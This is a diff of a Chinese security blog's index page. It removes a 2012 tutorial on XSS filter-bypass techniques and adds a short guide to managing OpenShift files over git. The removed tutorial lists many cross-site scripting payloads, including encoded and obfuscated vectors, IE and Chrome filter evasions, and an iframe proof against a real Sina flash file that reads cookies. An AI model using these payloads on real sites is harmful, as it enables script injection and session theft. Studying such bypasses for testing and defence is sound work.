@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="1.1 bypass Char 通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。 本节主要针对单字符过滤进行研究，分为引号、尖括号、 &hellip;&#8221;>
+  <meta name="description" content="生活在当今知识大爆炸时代，如何从浩瀚的知识海洋中发现自己感兴趣和需要的技术、构建自己完善的知识体系，是一件非常具有挑战的事，本文介绍自己摸索出来的一些学习方法和知识管理方法，并提供一些思考与软件供大家参考，主要对象为广大的技术宅男，希望能够帮助那些在还在摸索学习方法和知识管理的屌丝们， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,282 +67,6 @@
     <div id="content">
       <div class="blog-index">
   
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/09/03/xss_bypass_technology/">跨站测试与利用中的绕过技术</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-09-03T00:00:00-07:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/09/03/xss_bypass_technology/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h2>1.1 bypass Char</h2>
-
-
-<p>通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。</p>
-
-<p>本节主要针对单字符过滤进行研究，分为引号、尖括号、括号这三个符号进行研究。</p>
-
-<h3>1.1.1 引号</h3>
-
-
-<p>在跨站测试中很多的vector(即攻击向量)本身是不包含引号的，例如下面的一些vector。但是在利用中经常需要使用引号，如果对引号进行了过滤，可以采取如下措施进行绕过。
-[code lang=&ldquo;javascript&rdquo;]
-vector:</p>
-
-<script>alert(/ourren_demo/)</script>
-
-
-<p>&lt;iframe/onload=alert(/ourren_demo/)>
-<img src=x onerror=alert(/ourren_demo/)>
-<p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
-[/code]
-<strong>1)String.fromCharCode</strong></p>
-
-<p>fromCharCode可以对利用代码中的引号进行编码处理，但是需要利用eval函数结合进行使用，例如:
-[code lang=&ldquo;javascript&rdquo;]
-<script>alert(&lsquo;ourren_demo&rsquo;)</script>
-&mdash;&ndash;>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>
-[/code]
-<strong>2)location.hash</strong></p>
-
-<p>将带有引号的内容放在location.hash中，其实这个也可以突破跨站长度的控制。
-[code lang=&ldquo;javascript&rdquo;]
-<script>eval(location.hash.slice(1))</script>#alert(&lsquo;a&rsquo;)[/code]
-<h3>1.1.2 尖括号</h3>
-通常程序员为了偷懒都只会过滤尖括号，因此尖括号在跨站过滤中遇到情况最多。一般情况下如果输入没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行如下测试：</p>
-
-<p><strong>1</strong><strong>）事件函数</strong></p>
-
-<p>常用的一些事件函数有：onerror、onmouseover、onload等(同时可以关注下HTML5新标签)，需要的时候可以对JavaScript的事件函数进行fuzz。
-[code lang=&ldquo;javascript&rdquo;]
- <img src=x onerror=alert(/ourren_demo/)>
- <p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
- <frameset onload=alert(/ourren_demo/)>
- <body onload=alert(/ourren_demo/)>[/code]</p>
-
-<p><strong>2)style</strong><strong>与expression</strong></p>
-
-<p>通过标签的style样式进行跨站(测试中只有IE成功，同时还得考虑filter问题)。
-[code lang=&ldquo;javascript&rdquo;]
-<div style="width:expression(alert('ourren_demo'));">  [/code]</p>
-
-<p><strong>3)</strong> <strong>JavaScript</strong><strong>伪协议</strong></p>
-
-<p>JavaScript伪协议进行绕过。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
- <img src=javascript:alert('ourren_demo')> （仅IE)  [/code]
-<h3>1.1.3 括号</h3>
-如果测试中发现括号被过滤了，或者无法注入括号，可以进行如下测试：</p>
-
-<p>1）外部文件</p>
-
-<p>通过src引入外部文件，而利用代码放在外部文件中（其中外部文件的后缀可以不为js）。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<script src='1.js'></script>
-<script src='2.jpg'></script>
-[/code]</p>
-
-<p>2）hex、dec编码</p>
-
-<p>利用十六进制与十进制进行编码。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97
-&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
-[/code]
-<h2>1.2 bypass filter</h2>
-针对跨站问题日益严重，浏览器厂商从自身浏览器安全出发推出了各自的跨站过滤器。但是这类过滤器基本上只支持反射型跨站，其他类型跨站基本不受影响。</p>
-
-<p>各种浏览器采用的防御机制各不相同。反射型跨站防御方面：Firefox基本没什么防御，而IE和chrome都有各自的防御机制，并且都很难绕过，这里主要总结下现有的一些可以绕过机制。
-<h3>1.2.1 IE Filter</h3>
-IE从IE7就支持XSS Filter，其整体架构可见参考文献1，正则匹配部分可以参见文献2。实际处理步骤可分为三步：首先对IE进行启发式过滤（heuristic filters，正则匹配）；如果在HTTP请求中匹配到这些特征，那么就做一个动态签名（create dynamic signature）；如果在HTTP响应中有原来的签名，那么就进行替换修改（neuter response）。在IE全补丁下进行测试，现有公布的绕过技术基本上很少，先总结如下：</p>
-
-<p><strong>1</strong><strong>）<a href=></strong></p>
-
-<p>针对普通的反射型跨站，可以利用A标签和“sc%0aript”实现绕过，不过需要用户交互，这里需要美工师咯。其实原理是页面输出后这两个页面属于同一域，因此不会产生过滤。如果href里面的地址是不同域就会产生过滤。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&ldquo;>
-<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&rdquo;>
-<div style="position: absolute; left: 0px; top: 0px; height: 1000px; width: 1000px;
-padding: 1em;background:black;text-align: center;">click to continue</div></a>
-[/code]</p>
-
-<p><strong>2</strong><strong>）utf7</strong></p>
-
-<p>通过UTF7-BOM实现注入代码，全补丁情况下只有当header里编码为utf-7才能成功，可以参考文献3。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-%2BACIAPgA8-script%2BAD4-alert%28/ourren_demo/%29%2BADw-%2Fscript%2BAD4APAAi-&amp;oe=Windows-31J
-[/code]</p>
-
-<p><strong>3) Flash</strong></p>
-
-<p>在 <a href="http://blog.ourren.com">www.B.com</a>域名下用iframe嵌入<a href="http://blog.ourren.com">www.A.com</a>的flash XSS文件。当受害者打开了<a href="http://blog.ourren.com">www.B.com</a>的域名时，我们可以成功获取其在<a href="http://blog.ourren.com">www.A.com</a>的cookies数据，参见文献8。</p>
-
-<p>测试代码如下(IE)：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
-(function(){location.href=%22javascript:&lsquo;<script>alert(document.cookie)</script>&rsquo;%22})()&rdquo;></iframe>
-[/code]</p>
-
-<p>在chrome中，可能会导致浏览器崩溃，可以改用以下代码。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
-(function(){alert(document.cookie)})()&rdquo;></iframe>
-[/code]
-<h3>1.2.2 chrome filter</h3>
-chrome浏览器针对xss过滤规则跟IE有比较大的区别，不同版本的chrome测试也会不同，现有的资料可以参考文献4、5。</p>
-
-<p><strong>1）  </strong><strong>data</strong><strong>协议</strong></p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-?vuln=<a href="javascript:alert(document.cookie);">click</a> //会拦截
-&ndash;>转换成  <a href="javascript:void(0)">click</a>
-//bypass
-?vuln=<a href="data:text/html;
-base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=
-">click<a>
-->OK
-[/code]</p>
-
-<p><h2>1.3 bypass richtext</h2>
-富文本常见类别有留言，日志或者邮件等。与一般的跨站相比它可以使用现有的标签进行测试分析。一般过滤机制分为两种：黑名单、白名单，这两类机制实质都是基于正则匹配进行过滤，因此在测试过程中需要对比输入和输出，然后进行针对性变化。</p>
-
-<p>常见测试流程：输入常见标签和事件&mdash;&mdash;>是否有存在的标签没有过滤&mdash;&mdash;->变形或者分析其属性</p>
-
-<p>标签：<em>object, applet, base, link, meta, import, embed, vmlframe, iframe, script, style, isindex, form</em><em>，</em><em>textarea</em><em>，</em></p>
-
-<p>字符：<em>javascript:, vbscript: </em></p>
-
-<p>事件：<em>onload,onerror,on*</em>
-<h3>1.3.1 绕过规则</h3>
-本小节将一些常见的一些变化规则进行了归类，实际测试中结合多种方式进行组合测试。</p>
-
-<p><strong> 1</strong><strong>）未递归过滤</strong></p>
-
-<p>很多富文本过滤都是针对关键字过滤，但是没有进行递归过滤，导致过滤后的结果重新组成新的标签，例如：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;ifra<iframe>me>之&mdash;&mdash;过滤&mdash;&mdash;<iframe>&mdash;&mdash;&mdash;-<iframe>
-&lt;s<script></script>cript>&mdash;&ndash;过滤&mdash;<script>&mdash;&mdash;&mdash;-<script></script>
-[/code]
-<strong>2)</strong><strong>编码</strong></p>
-
-<p>利用字符的十六进制和十进制编码进行绕过关键字。由于expression只有IE能执行，因此仅限于IE。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
- <div style="width:expression(alert(/ourren_demo/))">ourren_demo</div><br/>
-<div style="width:\0065xpression(alert(/ourren_demo/))">ourren_demo</div>
-//两次不同类型编码
-<div style="width:\0065xpressio\6e(alert(/ourren_demo/))">ourren_demo</div><br/>
-<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110
-&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
-[/code]</p>
-
-<p><strong>3)</strong><strong>特殊字符</strong></p>
-
-<p>在构造的vector中可以插入tab、换行、等其他空白字符或者&#8221;/**&ldquo;绕过关键字匹配，基本上也只限于IE。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<img src="java  scr ipt:alert(/ourren_demo/)">  两次tab,ie6
-<div style="width:exp/**
-**/ression(alert(/ourren_demo/))">ourren_demo</div>  IE
-[/code]</p>
-
-<p><strong>4)</strong><strong>非常见协议</strong></p>
-
-<p>利用object标签，将date属性数据进行base64编码绕过关键数据，同时object标签也是经常被遗忘的标签。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgvaW5zaWdodC1sYWJzLyk8L3NjcmlwdD4=">
-[/code]</p>
-
-<p><strong>5)HTML5</strong></p>
-
-<p>利用HTML5新标签或者新属性进行绕过，相对而言这类利用要求的环境相对比较苛刻，详细见参考文献6。</p>
-
-<p>新标签:<em><button>,<video>,<audio>,<article>,<footer>,<nav></em></p>
-
-<p>新属性:<em>autocomplete, autofocus, pattern ..etc</em></p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<input onfocus=write(1) autofocus>
-<video poster=javascript:alert(1)//></video>
-[/code]</p>
-
-<p><strong>6)</strong><strong>浏览器方面</strong></p>
-
-<p>可以从浏览器解析角度进行考虑，需要浏览器解析方面进行深入分析，然后进行改进与分析，提供几个这类的vector。</p>
-
-<p>// IE的注释方式
-[code lang=&ldquo;javascript&rdquo;]
-<!--[if IE]><img src=# width=0 height=0 onerror=alert(/ourren_demo/)>&lt;![endif]&ndash;><br/>
-<comment><img src="</comment><img src=x onerror=alert(/ourren_demo/)//">   IE
-[/code]
-<h3>1.3.2 利用技巧</h3>
-在实际利用中常常会遇到一些其它问题，比如说代码死循环，长度不够用等先将其总结如下：</p>
-
-<p><strong>       1)expression</strong></p>
-
-<p>由于expression属性比较特殊,同时只支持IE，而其执行相当于一个死循环的EVAL函数，同时style标记里不能出现&#8221;;&ldquo;字符，也就是不能构造多条连接在一起的javascript，因此构造出如下语句：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<DIV STYLE="xss:ex/**/pre/**/ssion(eval(xss));" xss="var Then=new Date();Then.setTime(Then.getTime()+10*1000);
-if(document.cookie.indexOf('Cookie1=') == -1){document.cookie='Cookie1=RAY;expires='+Then.toGMTString();
-alert(/ourren_demo/);}">
-//设置一个COOKIE在10秒后失效，并在这条COOKIE语句中执行其他语句或函数。
-也可以通过window对象来实现：
-<div style="width:expression((window.x==1)?'':(window.x=1,alert(/ourren_demo/)))">xsser</div>
-[/code]</p>
-
-<p><strong>2)</strong><strong>长度限制</strong></p>
-
-<p>这个在&#8221;突破XSS字符数量限制执行任意JS代码&#8221;一文中有详细讲解，参考文献7。当然在支持HTML5的浏览器还可以利用下本地存储。
-<h2><em>参考文献</em></h2>
-<em>1.</em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx"><em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx">http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx</a></em></a><em> </em></p>
-
-<p><em>2. Abusing Internet Explorer 8&rsquo;s XSS Filters.pdf </em></p>
-
-<p><em>3. </em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html"><em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html">http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html</a></em></a><em> </em></p>
-
-<p><em>4. </em><a href="http://evilcos.me/?p=60"><em><a href="http://evilcos.me/?p=60">http://evilcos.me/?p=60</a></em></a><em> </em></p>
-
-<p><em>5. </em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html"><em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html">http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html</a></em></a><em> </em></p>
-
-<p><em>6. </em><a href="http://html5sec.org/"><em><a href="http://html5sec.org/">http://html5sec.org/</a></em></a><em> </em></p>
-
-<p><em>7. </em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt"><em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt">http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt</a></em></a><em> </em></p>
-
-<p><em>8.</em> <a href="http://zone.wooyun.org/content/368"><a href="http://zone.wooyun.org/content/368">http://zone.wooyun.org/content/368</a></a><em></em></p>
-</div>
-  
-  
-
-
-    </article>
   
   
     <article>
@@ -883,6 +607,52 @@ Android使用了Intent这个特殊类，实现在屏幕与屏幕之间移动。I
 
 <p><strong>intent-filter</strong>
 与之有关系的一个类叫IntentFilter。相对于intent是一个有效的做某事的请求，一个intent filter则用于描述一个activity（或者Intent Receiver）能够操作哪些intent。什么时候启动或者触发函数。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2012/06/28/openshift_file_manage/">Openshift文件管理概述</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-06-28T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2012/06/28/openshift_file_manage/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>      由于openshift可以使用git进行文件管理，其实这个过程跟管理github是一样的，不过国内针对openshift的文章很少。本文重点阐述如何在windows下进行文件管理。需要安装软件：TortoiseGit、msysgit、git。安装步骤就不说了，作为伟大的程序员不可能这点事都搞不定。
+ 1、生成key
+      主要使用TortoiseGit中的Putty Key Generator工具生成private key和public key。  打开Putty Key Generator工具界面如下图所示，点击Generate后在上面空白处移动就生成字符了。
+      <img src="http://ourren.b0.upaiyun.com/openshift_file_1.jpg" alt="openshift_file_putty" width="487" height="462">
+      最好在生成的时候设置一个密码，然后保存private key和public key文件，注意保管好你的private key文件。
+        <img src="http://ourren.b0.upaiyun.com/openshift_file_2.jpg" alt="openshift_putty_passwd" width="487" height="462">
+ 2、openshift创建项目
+      总体来说，openshift可以通过两种方式进行创建项目，一个是通过安装openshift的客户端软件，命令行创建工程，另外一个方式进行通过网页进行创建项目。这里以网站创建项目为例。  登陆网站后，选择Create Application选项卡，然后选择程序类型，就可以直接创建，这里有一篇详细的文章可作为<a href="http://lx.shellcodes.org/show/4fe87fac04b91e741c000003">参考</a>。
+3、如何更新文件
+      大体思路：在网站上提交第一步生成的public key后，本地使用git进行文件管理。
+      首先登陆网站后选择My Account 中添加public key。
+       <img src="http://ourren.b0.upaiyun.com/openshift_file_3.jpg" alt="openshift_public_key" width="482" height="256">
+      然后选择 My Applications 后，双击我们刚新建的应用，就可以看到GIT REPOSITORY的值。
+      <img src="http://ourren.b0.upaiyun.com/openshift_file_4.jpg" alt="openshift_ssh" width="564" height="151">
+      在本地网站开发文件夹右键git clone，填入刚刚复制的GIT REPOSITORY的值，然后选择private key为第一步保存的文件，大功告成。</p>
 </div>
   
   
